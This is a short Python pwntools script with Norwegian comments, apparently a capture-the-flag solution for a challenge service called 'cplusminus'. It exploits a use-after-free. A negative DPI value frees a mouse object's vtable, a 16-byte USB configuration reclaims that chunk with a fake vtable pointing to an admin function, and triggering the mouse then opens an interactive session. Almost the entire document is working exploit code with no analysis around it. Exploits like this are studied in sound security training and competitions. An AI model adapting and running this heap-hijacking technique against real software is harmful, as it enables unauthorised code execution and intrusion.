#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"

ADMIN_FN = 0x401259

def exploit(io):
    def opt(n):
        io.sendlineafter(b"Option: ", str(n).encode())

    # 1. Lag USB device først
    opt(1)
    # USB på ID 0

    # 2. Lag mouse med negativ DPI -> frigjør vtable (16 bytes)
    opt(2)
    io.sendlineafter(b"DPI for MouseDevice: ", b"-1")
    # Mouse på ID 1, vtable frigjort

    # 3. Configure USB med size=16 -> malloc(16) tar freed vtable chunk!
    opt(5)
    io.sendlineafter(b"ID: ", b"0")
    io.sendlineafter(b"Configuration size: ", b"16")
    
    fake_vtable = p64(ADMIN_FN) + p64(ADMIN_FN)
    io.recvuntil(b"Configuration: ")
    io.send(fake_vtable + b"\n")

    # 4. Trigger på mouse (ID 1)
    opt(4)
    io.sendlineafter(b"ID: ", b"1")

    io.interactive()

if __name__ == "__main__":
    io = remote("cplusminus", 1337)
    exploit(io)